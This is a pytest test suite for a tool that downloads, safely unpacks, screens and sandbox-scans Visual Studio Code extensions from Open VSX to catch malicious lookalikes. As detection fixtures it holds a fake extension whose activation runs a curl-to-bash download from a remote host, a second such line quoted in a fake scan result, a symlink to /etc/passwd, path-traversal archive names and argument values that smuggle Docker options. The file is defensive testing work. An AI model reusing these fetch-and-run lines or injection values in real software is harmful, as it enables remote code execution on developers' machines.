"""VS Code extension hunt: safe vsix handling, detection, screening, orchestration.

No network and no Docker: registry calls go through a fake client, the sandbox
scan is a fake, and archives are built in-memory with zipfile.
"""

from __future__ import annotations

import io
import json
import zipfile
from pathlib import Path

import pytest

from git_warden import intel_exchange as bus
from git_warden.db import Database
from git_warden.extensions import hunt as ext_hunt
from git_warden.extensions import vsix
from git_warden.extensions.openvsx import Extension, _from_json
from git_warden.scanning.sandbox_runner import build_run_argv, scan_extension_sandboxed

MALICIOUS_JS = """const cp = require('child_process');
function activate(ctx) {
  cp.exec("curl -s http://185.199.10.7/payload.sh | bash");
}
module.exports = { activate };
"""
INSTALLER_JS = """const cp = require('child_process');
function activate() { cp.exec("curl -fsSL https://sh.rustup.rs | sh"); }
"""


def _write_ext(root: Path, js: str, *, manifest: dict | None = None) -> Path:
    (root / "dist").mkdir(parents=True)
    (root / "dist" / "extension.js").write_text(js)
    (root / "package.json").write_text(json.dumps(manifest or {
        "name": "prettier-vscode", "publisher": "esbenp-dev", "version": "1.0.1",
        "main": "./dist/extension.js", "activationEvents": ["onStartupFinished"],
        "contributes": {"themes": [{"label": "x", "path": "./t.json"}]}}))
    return root


def _vsix_bytes(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


# --- safe download / unpack ---------------------------------------------------


@pytest.mark.parametrize("url,ok", [
    ("https://open-vsx.org/api/a/b/1.0.0/file/a.b-1.0.0.vsix", True),
    ("https://openvsxorg.blob.core.windows.net/resources/a/b/a.b.vsix", True),
    ("http://open-vsx.org/api/a/b/file.vsix", False),          # not https
    ("https://open-vsx.org.evil.com/x.vsix", False),            # suffix spoof
    ("https://evil.com/open-vsx.org/x.vsix", False),
])
def test_download_host_allowlist(url, ok):
    assert vsix.host_allowed(url) is ok


class _Resp:
    def __init__(self, status, location=None, body=b""):
        self.status_code, self.headers, self._body = status, {}, body
        if location:
            self.headers["Location"] = location

    def iter_content(self, n):
        for i in range(0, len(self._body), n):
            yield self._body[i:i + n]

    def close(self):
        pass


class _Session:
    def __init__(self, responses):
        self.responses, self.urls = list(responses), []

    def get(self, url, **kw):
        self.urls.append(url)
        return self.responses.pop(0)


def test_download_follows_only_allowlisted_redirects(tmp_path):
    ok = _Session([_Resp(302, "https://openvsxorg.blob.core.windows.net/r/a.vsix"),
                   _Resp(200, body=b"PK..")])
    vsix.download("https://open-vsx.org/api/a/b/1/file/a.vsix", tmp_path / "a", session=ok)
    assert (tmp_path / "a").read_bytes() == b"PK.."
    evil = _Session([_Resp(302, "https://attacker.example/a.vsix")])
    with pytest.raises(vsix.VsixError, match="not allowlisted"):
        vsix.download("https://open-vsx.org/api/a/b/1/file/a.vsix", tmp_path / "b",
                      session=evil)
    assert evil.urls == ["https://open-vsx.org/api/a/b/1/file/a.vsix"]


def test_download_enforces_size_cap(tmp_path):
    s = _Session([_Resp(200, body=b"x" * 2000)])
    with pytest.raises(vsix.VsixError, match="size"):
        vsix.download("https://open-vsx.org/x.vsix", tmp_path / "a", session=s,
                      max_bytes=1000)


@pytest.mark.parametrize("bad", ["../escape.js", "/abs/path.js", "C:/win.js",
                                 "extension/../../escape.js"])
def test_safe_extract_rejects_path_traversal(tmp_path, bad):
    archive = tmp_path / "a.vsix"
    archive.write_bytes(_vsix_bytes({bad: "x"}))
    with pytest.raises(vsix.VsixError):
        vsix.safe_extract(archive, tmp_path / "out")
    assert not (tmp_path / "escape.js").exists()


def test_safe_extract_skips_symlinks_and_unpacks_files(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("extension/package.json", "{}")
        link = zipfile.ZipInfo("extension/evil-link")
        link.external_attr = (0o120777 << 16)
        zf.writestr(link, "/etc/passwd")
    archive = tmp_path / "a.vsix"
    archive.write_bytes(buf.getvalue())
    out = vsix.safe_extract(archive, tmp_path / "out")
    assert (out / "extension" / "package.json").is_file()
    assert not (out / "extension" / "evil-link").exists()


def test_safe_extract_refuses_non_zip(tmp_path):
    archive = tmp_path / "a.vsix"
    archive.write_bytes(b"not a zip")
    with pytest.raises(vsix.VsixError, match="zip"):
        vsix.safe_extract(archive, tmp_path / "out")


# --- detection ------------------------------------------------------------------


def test_malicious_extension_confirms_on_fetch_to_shell(tmp_path):
    root = _write_ext(tmp_path / "ext", MALICIOUS_JS)
    r = vsix.analyze_extension(root, "esbenp-dev.prettier-vscode")
    assert r["confirmed"] and r["confidence"] == "auto"
    assert [f["rule"] for f in r["confirming_findings"]] == ["js-exec-fetch-shell"]
    # the compiled entry under dist/ is first-party code in an extension
    assert r["confirming_findings"][0]["file"].endswith("extension.js")
    assert set(r["extension"]["signals"]) == {
        "extension/startup-activation", "extension/declarative-pack-with-code"}


def test_reputable_installer_does_not_confirm(tmp_path):
    root = _write_ext(tmp_path / "ext", INSTALLER_JS)
    r = vsix.analyze_extension(root, "rust.helper")
    assert not r["confirmed"]


def test_dist_entry_is_hidden_without_exposure(tmp_path):
    # Guard for expose_entry_dirs: Warden's repo rules skip dist/ as build output.
    from git_warden.scanning.tier2 import analyze_repo

    root = _write_ext(tmp_path / "ext", MALICIOUS_JS)
    assert not analyze_repo(root, "x.y").confirmed


def test_extension_signals_flag_bundled_binaries(tmp_path):
    root = _write_ext(tmp_path / "ext", "module.exports = {}",
                      manifest={"name": "a", "main": "./dist/extension.js",
                                "activationEvents": ["*"],
                                "contributes": {"commands": []}})
    (root / "bin").mkdir()
    (root / "bin" / "helper.exe").write_bytes(b"MZ")
    (root / "run.ps1").write_text("Write-Host hi")
    rules = {f.rule for f in vsix.extension_signals(root, json.loads(
        (root / "package.json").read_text()))}
    assert rules == {"startup-activation", "bundled-native-binary", "bundled-script"}


# --- Tier-1 screening -------------------------------------------------------------

POPULAR = [{"id": "esbenp.prettier-vscode", "display": "Prettier - Code formatter"}]


def _ext(ns, name, display="", downloads=1000, url="https://open-vsx.org/x.vsix"):
    return Extension(namespace=ns, name=name, version="1.0.0", display_name=display,
                     download_url=url, download_count=downloads)


def test_lookalike_detection():
    assert ext_hunt.lookalike_of(_ext("esbenp-dev", "prettier-vscode"), POPULAR) \
        == "esbenp.prettier-vscode"
    assert ext_hunt.lookalike_of(_ext("someone", "pretty", "Prettier - Code formatter"),
                                 POPULAR) == "esbenp.prettier-vscode"
    assert ext_hunt.lookalike_of(_ext("esbenp", "prettier-vscode"), POPULAR) is None
    assert ext_hunt.lookalike_of(_ext("acme", "kubernetes-tools", "Kubernetes"),
                                 POPULAR) is None


def test_from_json_rejects_unsafe_ids():
    assert _from_json({"namespace": "../etc", "name": "x"}) is None
    e = _from_json({"namespace": "a", "name": "b", "version": "1.2.3",
                    "files": {"download": "https://open-vsx.org/f.vsix"},
                    "downloadCount": 5})
    assert e.ext_id == "a.b" and e.download_url.endswith(".vsix") and e.download_count == 5


class _Client:
    def __init__(self):
        self.recent_list = [_ext("fresh", "tool", downloads=3)]
        self.search_map = {"Prettier - Code formatter": [
            _ext("esbenp", "prettier-vscode", "Prettier - Code formatter", 10**7),
            _ext("esbenp-dev", "prettier-vscode", "Prettier - Code formatter", 12)]}
        self.ns = {"badpub": ["other-ext"]}

    def recent(self, n):
        return list(self.recent_list)

    def search(self, q, size=25):
        return list(self.search_map.get(q, []))

    def namespace_extensions(self, ns):
        return self.ns.get(ns, [])

    def extension(self, ns, name):
        return _ext(ns, name, downloads=40)


def _db(tmp_path):
    db = Database.open(tmp_path / "w.sqlite")
    with db.transaction() as c:
        c.execute("INSERT INTO malicious_artifacts (artifact_type, ecosystem, name, source) "
                  "VALUES ('package', 'openvsx', 'badpub.stealer', 'open_source_malware')")
    return db


def test_collect_candidates_ranks_lookalikes_and_bad_publishers(tmp_path):
    db = _db(tmp_path)
    cands = ext_hunt.collect_candidates(_Client(), db, recent=5, popular=POPULAR)
    by_id = {c.ext_id: c for c in cands}
    assert "esbenp.prettier-vscode" not in by_id           # the genuine one
    assert by_id["badpub.other-ext"].score >= 5
    assert any("lookalike" in r for r in by_id["esbenp-dev.prettier-vscode"].reasons)
    assert any("few downloads" in r for r in by_id["fresh.tool"].reasons)
    assert cands[0].ext_id == "badpub.other-ext"            # highest risk first
    db.close()


def test_hunt_stores_results_records_intel_and_skips_rescans(tmp_path, monkeypatch):
    monkeypatch.setattr(ext_hunt, "load_popular", lambda: POPULAR)
    db = _db(tmp_path)
    scanned = []

    def fake_scan(ext_id, url):
        scanned.append(ext_id)
        if ext_id == "fresh.tool":
            return {"fetch_failed": True, "reason": "HTTP 404"}
        hit = ext_id == "esbenp-dev.prettier-vscode"
        return {"confirmed": hit, "confidence": "auto" if hit else "none", "bash_score": 9,
                "confirming_findings": [{
                    "file": "entry_dist/extension.js", "line": 3,
                    "category": "download_exec", "rule": "js-exec-fetch-shell",
                    "snippet": 'cp.exec("curl -s http://evil-drop.top/p.sh | bash")'}]
                if hit else [],
                "learned_signatures": ["settings/linux?flag="] if hit else [],
                "extension": {"version": "1.0.0", "signals": []}}

    report = ext_hunt.run_extension_hunt(db, client=_Client(), limit=10, recent=5,
                                         scan=fake_scan)
    c = report["counts"]
    assert (c["confirmed"], c["confirmed_auto"], c["fetch_failed"]) == (1, 1, 1)
    row = db.get_extension("openvsx:esbenp-dev.prettier-vscode")
    assert (row["status"], row["confidence"]) == ("confirmed", "auto")
    assert db.get_extension("openvsx:fresh.tool")["status"] == "fetch_failed"
    assert "evil-drop.top" in bus.values("c2_host")
    assert "settings/linux?flag=" in bus.values("code_sig")

    md = ext_hunt.summary_markdown(report)
    assert "### Confirmed malicious extension: `esbenp-dev.prettier-vscode`" in md
    assert "js-exec-fetch-shell" in md

    # Same versions again: already-scanned verdicts are not re-fetched.
    scanned.clear()
    report2 = ext_hunt.run_extension_hunt(db, client=_Client(), limit=10, recent=5,
                                          scan=fake_scan)
    assert "esbenp-dev.prettier-vscode" not in scanned
    assert report2["counts"]["skipped_known"] >= 2
    db.close()


# --- sandbox plumbing -------------------------------------------------------------


def test_extension_sandbox_argv_keeps_isolation_and_passes_vsix_args():
    argv = build_run_argv("a.b", args=["--vsix", "a.b", "https://open-vsx.org/x.vsix"])
    assert argv[-3:] == ["--vsix", "a.b", "https://open-vsx.org/x.vsix"]
    assert "--read-only" in argv and "65534:65534" in argv
    assert not any(a.startswith("-v") or a == "--volume" for a in argv)


def test_scan_extension_sandboxed_parses_result():
    class P:
        returncode, stderr = 0, ""
        stdout = "log line\n" + json.dumps({"confirmed": True, "confidence": "auto"})

    r = scan_extension_sandboxed("a.b", "https://open-vsx.org/x.vsix",
                                 runner=lambda *a, **k: P())
    assert r == {"confirmed": True, "confidence": "auto"}


def test_sandbox_entry_vsix_mode(tmp_path, monkeypatch, capsys):
    from git_warden import sandbox_entry

    archive = _vsix_bytes({"extension/package.json": json.dumps(
        {"name": "x", "version": "1.0.0", "main": "./dist/extension.js"}),
        "extension/dist/extension.js": MALICIOUS_JS})

    def fake_download(url, dest, **kw):
        dest.write_bytes(archive)
        return dest

    monkeypatch.setattr(vsix, "download", fake_download)
    assert sandbox_entry.main(["--vsix", "a.b", "https://open-vsx.org/x.vsix"]) == 0
    out = json.loads(capsys.readouterr().out.strip().splitlines()[-1])
    assert out["confirmed"] and out["extension"]["entry_points"] == ["./dist/extension.js"]
    assert sandbox_entry.main(["--vsix", "a.b"]) == 2


def test_cli_fails_closed_without_sandbox(monkeypatch, tmp_path):
    from git_warden import cli
    from git_warden.scanning import sandbox_runner

    monkeypatch.setattr(sandbox_runner, "docker_available", lambda: False)
    assert cli.main(["extensions", "--db", str(tmp_path / "w.sqlite")]) == 2
    assert not (tmp_path / "w.sqlite").exists()


@pytest.mark.parametrize("ext_id,url", [
    ("--privileged.x", "https://open-vsx.org/x.vsix"),            # option-like id
    ("a.b", "https://evil.example/x.vsix"),                         # host not allowed
    ("a.b", "http://open-vsx.org/x.vsix"),                          # not https
    ("a.b", "https://open-vsx.org/x.vsix --rm"),                    # smuggled token
    ("a b.c", "https://open-vsx.org/x.vsix"),
])
def test_scan_extension_sandboxed_rejects_untrusted_argv(ext_id, url):
    calls = []
    r = scan_extension_sandboxed(ext_id, url, runner=lambda *a, **k: calls.append(a))
    assert r is None and calls == []
